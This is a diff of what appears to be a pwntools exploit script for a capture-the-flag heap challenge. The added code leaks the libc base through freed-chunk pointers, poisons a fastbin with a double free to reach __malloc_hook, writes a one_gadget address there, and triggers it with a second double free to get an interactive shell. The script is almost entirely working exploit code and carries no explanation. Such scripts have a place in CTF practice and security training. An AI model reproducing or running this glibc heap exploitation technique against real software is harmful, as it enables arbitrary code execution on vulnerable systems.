@@ -56,27 +56,53 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
-	sla(':',_add)
-	sla(':',index)
+_add,_free,_edit,_show = 1,3,4,2
+def add(size,content='a'*8):
+	sla('choice :',_add)
+	sla(':',size)
 	sa(':',content)
+	sla(':', '123')
 
 def free(index):
-	sla(':',_free)
+	sla('choice :',_free)
 	sla(':',index)
 
-def edit(index,content):
-	sla(':',_edit)
+def edit(index,size,content):
+	sla('choice:',_edit)
 	sla(':',index)
+	sla(':',size)
 	sa(':',content)
 
-def show(index):
-	sla(':',_show)
-	sla(':',index)
+def show():
+	sla('choice :',_show)
 
 # start
+def clean():
+	sla('choice :', 4)
 
+add(0x80)
+add(0x60)
+add(0x60)
+free(0)
+clean()
+add(0x80)
+show()
+ru('a'*8)
+base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
+leak('base',base)
+malloc_hook = base + libc.sym['__malloc_hook']
+one = base + 0xf02a4
+
+free(1)
+free(2)
+free(1)
+add(0x60,p64(malloc_hook-0x23))
+add(0x60)
+add(0x60)
+add(0x60,'a'*0x13 + p64(one))
+
+free(0)
+free(0) # malloc_print_err
 # end
 
 p.interactive()
